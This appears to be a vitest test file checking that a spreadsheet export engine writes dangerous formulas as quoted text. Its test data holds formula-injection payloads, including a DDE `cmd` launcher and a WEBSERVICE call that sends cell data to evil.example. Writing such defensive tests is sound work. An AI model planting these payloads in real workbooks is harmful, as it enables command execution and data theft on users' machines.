/**
 * Call-out formulas in the JS export engine (round 5, module H1). A cells op whose formula would make Excel reach outside the workbook by
 * itself (DDE `|`, [book.xlsx] / UNC / URL references, WEBSERVICE / IMAGE / RTD / CALL / REGISTER / EXEC) is written by replayLog as TEXT
 * with the quote prefix — never as <f> — like the Excel runner (XlRunner.Cells.Build, warning UNSAFE_FORMULA). Ordinary formulas and
 * HYPERLINK stay formulas. The predicate is `isUnsafeFormula` of src/core/export/comJob.ts (shared vectors with the runner).
 */
import fs from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { exportWithJs } from '../../src/core/export';
import { isUnsafeFormula } from '../../src/core/export/comJob';
import { toUiForm } from '../../src/core/formula/forms';
import type { CellWrite, LoggedOp } from '../../src/core/types';
import { readBook } from '../../src/core/xlsx/read';
import { buildPremerged } from '../../src/core/xlsx/premerge';
import { replayLog } from '../../src/core/xlsx/replay';
import { buildXlsx, part } from '../golden/build';
import { SRC_SST, miniInput, mini, n as numCell, s as strCell } from '../golden/mini-scenario';

const VECTORS = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'server', 'fixtures', 'unsafe-formulas.json'), 'utf8')) as { dangerous: string[]; harmless: string[] };

const cells = (writes: CellWrite[], reason: 'edit' | 'toValues' = 'edit'): LoggedOp => ({ kind: 'cells', sheet: 'S', writes, reason });
const base = () => buildXlsx([{ name: 'S', data: '<row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1"><v>1</v></c></row>' }], { sst: ['x'] });
const sheetXml = async (b: Uint8Array) => (await part(b, 'xl/worksheets/sheet1.xml'))!;
const cellXml = (xml: string, ref: string) => new RegExp(`<c r="${ref}"[^>]*?(?:/>|>[\\s\\S]*?</c>)`).exec(xml)?.[0] ?? '';

/** is the xf of cell `ref` a quotePrefix xf */
async function hasQuotePrefix(bytes: Uint8Array, ref: string): Promise<boolean> {
  const xml = await sheetXml(bytes);
  const s = Number(new RegExp(`<c r="${ref}"[^>]*?\\ss="(\\d+)"`).exec(xml)?.[1] ?? 0);
  const styles = (await part(bytes, 'xl/styles.xml'))!;
  const xfs = [...(/<cellXfs\b[\s\S]*?<\/cellXfs>/.exec(styles)![0]).matchAll(/<xf\b[^>]*?(?:\/>|>[\s\S]*?<\/xf>)/g)].map((m) => m[0]);
  return /quotePrefix="(1|true)"/.test(xfs[s] ?? '');
}

describe('replayLog writes call-out formulas as text (the Excel engine does the same)', () => {
  it('every dangerous vector of the shared fixture becomes a quoted TEXT cell with the formula as typed, never an <f>', async () => {
    const writes = VECTORS.dangerous.map((f, i): CellWrite => ({ row: 3 + i, col: 1, cell: { t: 's', v: null, f: f.replace(/^=/, '') } }));
    const out = await replayLog(await base(), [cells(writes)]);
    const xml = await sheetXml(out);
    expect(xml).not.toMatch(/<f[\s>]/);
    const book = await readBook(out, 'x.xlsx');
    const g = book.sheets[0];
    for (let i = 0; i < VECTORS.dangerous.length; i++) {
      const c = g.rows[2 + i]?.[0];
      const ui = toUiForm(VECTORS.dangerous[i].replace(/^=/, ''));
      expect(c?.f, VECTORS.dangerous[i]).toBeUndefined();
      expect(c?.t, VECTORS.dangerous[i]).toBe('s');
      expect(c?.v, VECTORS.dangerous[i]).toBe(ui.startsWith('=') ? ui : '=' + ui);
      expect(await hasQuotePrefix(out, `A${3 + i}`), VECTORS.dangerous[i]).toBe(true);
    }
  });

  it('a formula given with the leading "=" (UI form) is handled the same; the _xlfn. prefix of the file form is dropped from the text', async () => {
    const out = await replayLog(await base(), [cells([
      { row: 3, col: 1, cell: { t: 's', v: null, f: '=_xlfn.WEBSERVICE("http://evil.example/"&B1)' } },
      { row: 4, col: 1, cell: { t: 's', v: null, f: "=cmd|' /C calc'!A0" } },
    ])]);
    const g = (await readBook(out, 'x.xlsx')).sheets[0];
    expect(g.rows[2]![0]?.v).toBe('=WEBSERVICE("http://evil.example/"&B1)');
    expect(g.rows[3]![0]?.v).toBe("=cmd|' /C calc'!A0");
    expect(await sheetXml(out)).not.toMatch(/<f[\s>]/);
  });

  it('ordinary formulas, HYPERLINK, structured references and look-alike function names stay formulas', async () => {
    const harmless = VECTORS.harmless.filter((f) => f !== '');
    const out = await replayLog(await base(), [cells(harmless.map((f, i): CellWrite => ({ row: 3 + i, col: 1, cell: { t: 'n', v: 0, f: f.replace(/^=/, '') } })))]);
    const xml = await sheetXml(out);
    for (let i = 0; i < harmless.length; i++) {
      const c = cellXml(xml, `A${3 + i}`);
      expect(c, harmless[i]).toMatch(/<f>/);
      expect(c, harmless[i]).not.toMatch(/t="s"/);
    }
    expect(await hasQuotePrefix(out, 'A3')).toBe(false);
  });

  it('a dynamic-array formula and a formula with a number format are neutralised too (number format kept, no array, no metadata)', async () => {
    const out = await replayLog(await base(), [cells([
      { row: 3, col: 1, cell: { t: 's', v: null, f: "'[x.xlsx]S'!A1:A3", dyn: true } },
      { row: 4, col: 1, cell: { t: 'n', v: 0, f: 'WEBSERVICE("x")', numFmt: '0.00' } },
    ])]);
    const xml = await sheetXml(out);
    expect(xml).not.toMatch(/<f[\s>]/);
    expect(xml).not.toMatch(/\scm="/);
    const book = await readBook(out, 'x.xlsx');
    expect(book.sheets[0]!.rows[3]![0]).toMatchObject({ t: 's' });
    expect(book.styles[book.sheets[0]!.rows[3]![0]!.s ?? 0]!.numFmt).toBe('0.00');
    expect(await hasQuotePrefix(out, 'A4')).toBe(true);
  });

  it('a text constant that Excel would parse as a call-out formula gets the quote prefix; other texts are untouched', async () => {
    const out = await replayLog(await base(), [cells([
      { row: 3, col: 1, cell: { t: 's', v: "=cmd|' /C calc'!A0" } },
      { row: 4, col: 1, cell: { t: 's', v: "+cmd|' /C calc'!A0" } },
      { row: 5, col: 1, cell: { t: 's', v: "-cmd|x" } },
      { row: 6, col: 1, cell: { t: 's', v: '＝WEBSERVICE("x")' } }, // full-width = (Excel-ja takes it as =)
      { row: 7, col: 1, cell: { t: 's', v: '=1+1' } }, // not dangerous: stays plain text as the doc decided
      { row: 8, col: 1, cell: { t: 's', v: 'a | b' } },
      { row: 9, col: 1, cell: { t: 's', v: '@SUM(A1)' } },
      { row: 10, col: 1, cell: { t: 's', v: "x=cmd|' /C calc'!A0" } }, // not a formula start
    ])]);
    const book = await readBook(out, 'x.xlsx');
    const g = book.sheets[0];
    const expected = [true, true, true, true, false, false, false, false];
    for (let i = 0; i < expected.length; i++) {
      expect(g.rows[2 + i]![0]?.t).toBe('s');
      expect(await hasQuotePrefix(out, `A${3 + i}`), String(g.rows[2 + i]![0]?.v)).toBe(expected[i]);
    }
    expect(g.rows[2]![0]?.v).toBe("=cmd|' /C calc'!A0"); // the text is exactly what was written
  });

  it("'toValues' writes and cleared cells are not touched; a value over a neighbour keeps its neighbour's formula", async () => {
    const out = await replayLog(await base(), [
      cells([{ row: 3, col: 1, cell: { t: 'n', v: 1, f: 'SUM(B1:B2)' } }, { row: 4, col: 1, cell: null }]),
      cells([{ row: 5, col: 1, cell: { t: 'n', v: 7 } }], 'toValues'),
    ]);
    const xml = await sheetXml(out);
    expect(cellXml(xml, 'A3')).toMatch(/<f>SUM\(B1:B2\)<\/f>/);
    expect(cellXml(xml, 'A5')).toMatch(/<v>7<\/v>/);
  });

  it('warnings: one UNSAFE_FORMULA per cell named by address (at most 20, then one summary line), delivered through onWarning', async () => {
    const writes: CellWrite[] = [];
    for (let i = 0; i < 25; i++) writes.push({ row: 3 + i, col: 1, cell: { t: 's', v: null, f: `WEBSERVICE("x${i}")` } });
    writes.push({ row: 40, col: 2, cell: { t: 's', v: null, f: 'SUM(B1:B2)' } });
    const warnings: Array<{ code: string; message: string }> = [];
    await replayLog(await base(), [cells(writes)], undefined, (w) => warnings.push(w));
    expect(warnings).toHaveLength(21);
    expect(warnings.every((w) => w.code === 'UNSAFE_FORMULA')).toBe(true);
    expect(warnings[0].message).toMatch(/^セル A3 の内容は、外部のプログラム・ファイル・Web を呼び出す数式の形/);
    expect(warnings[0].message).toMatch(/文字列として書き込みました$/);
    expect(warnings[19].message).toContain('セル A22 ');
    expect(warnings[20].message).toBe('同様に文字列として書き込んだセルが他にもあります');
    // no warning for a harmless log, and a throwing callback never aborts the export
    const quiet: string[] = [];
    await replayLog(await base(), [cells([{ row: 3, col: 1, cell: { t: 'n', v: 1, f: 'SUM(B1:B2)' } }])], undefined, (w) => quiet.push(w.code));
    expect(quiet).toEqual([]);
    const bytes = await replayLog(await base(), [cells(writes.slice(0, 1))], undefined, () => { throw new Error('ui'); });
    expect((await readBook(bytes, 'x.xlsx')).sheets[0]!.rows[2]![0]?.v).toBe('=WEBSERVICE("x0")');
  });

  it('exportWithJs passes onWarning on (the app facade)', async () => {
    const seen: string[] = [];
    const out = await exportWithJs(await base(), [cells([{ row: 3, col: 1, cell: { t: 's', v: null, f: "cmd|' /C calc'!A0" } }])], undefined, (w) => seen.push(w.message));
    expect(seen).toHaveLength(1);
    expect(await sheetXml(out)).not.toMatch(/<f[\s>]/);
  });

  it('the cell the unsafe write targets after earlier moves is the one named (positions as of that point of the log)', async () => {
    const warnings: string[] = [];
    await replayLog(await base(), [
      { kind: 'struct', sheet: 'S', op: { type: 'insert', axis: 'col', at: 1, count: 2 } },
      cells([{ row: 2, col: 4, cell: { t: 's', v: null, f: 'RTD("a","",1)' } }]),
    ], undefined, (w) => warnings.push(w.message));
    expect(warnings[0]).toContain('セル D2 ');
  });

  it('writes land in a table totals row / header like any other text (neutralised before the table rules)', async () => {
    // no table needed: the neutralised cell is an ordinary text write, which every path of writeCells already handles
    const out = await replayLog(await base(), [cells([{ row: 1, col: 3, cell: { t: 's', v: null, f: 'EXEC("calc")' } }])]);
    const g = (await readBook(out, 'x.xlsx')).sheets[0];
    expect(g.rows[0]![2]?.v).toBe('=EXEC("calc")');
  });

  it('isUnsafeFormula agrees with the vectors the engine relies on', () => {
    for (const f of VECTORS.dangerous) expect(isUnsafeFormula(f), f).toBe(true);
    for (const f of VECTORS.harmless) expect(isUnsafeFormula(f), f).toBe(false);
  });
});

describe('buildPremerged never keeps an imported call-out formula live (the same rule as for typed ones)', () => {
  it('a source column holding WEBSERVICE / DDE / external-workbook formulas arrives as its cached values; ordinary same-row formulas stay live', async () => {
    const m = await mini();
    const row = (r: number, id: number, pt: number) => `<row r="${r}">${strCell('A' + r, id)}${numCell('B' + r, pt, 2)}`
      + `<c r="C${r}" t="str"><f>WEBSERVICE("http://evil.example/"&amp;B${r})</f><v>web${r}</v></c>`
      + `<c r="D${r}" t="str"><f>'[x.xlsx]Sheet1'!A${r}</f><v>ext${r}</v></c>`
      + `<c r="E${r}"><f>B${r}*2</f><v>${pt * 2}</v></c></row>`;
    const src = await buildXlsx([{
      name: 'Src',
      data: `<row r="1">${strCell('A1', 0, 1)}${strCell('B1', 1, 1)}${strCell('C1', 2, 1)}${strCell('D1', 3, 1)}${strCell('E1', 3, 1)}</row>` + [row(2, 4, 70), row(3, 6, 90), row(4, 8, 80), row(5, 10, 50)].join(''),
    }], { sst: SRC_SST });
    const input = miniInput(m, m.base, src);
    input.sources[0].region.lastCol = 5;
    input.imports = [2, 3, 4, 5].map((col) => ({ sourceId: 'src', col }));
    const r = await buildPremerged(input);
    const xml = (await part(r.bytes, 'xl/worksheets/sheet1.xml'))!;
    expect(xml).not.toMatch(/WEBSERVICE/);
    expect(xml).not.toMatch(/x\.xlsx/);
    const g = (await readBook(r.bytes, 'm.xlsx')).sheets[0];
    // imported columns C (点数) D (WEB) E (EXT) F (計算): matched rows 2..4 = source rows 3, 4, 2
    expect(g.rows[1]![3]).toMatchObject({ t: 's', v: 'web3' });
    expect(g.rows[1]![4]).toMatchObject({ t: 's', v: 'ext3' });
    expect(g.rows[1]![3]?.f).toBeUndefined();
    expect(g.rows[1]![4]?.f).toBeUndefined();
    expect(g.rows[1]![5]?.f).toBe('C2*2');
    expect(r.report.formulasKept).toBe(4); // 計算 of the 3 matched rows + the appended row
    expect(r.report.formulasToValues).toBe(8); // WEB + EXT of the same 4 rows
  });
});
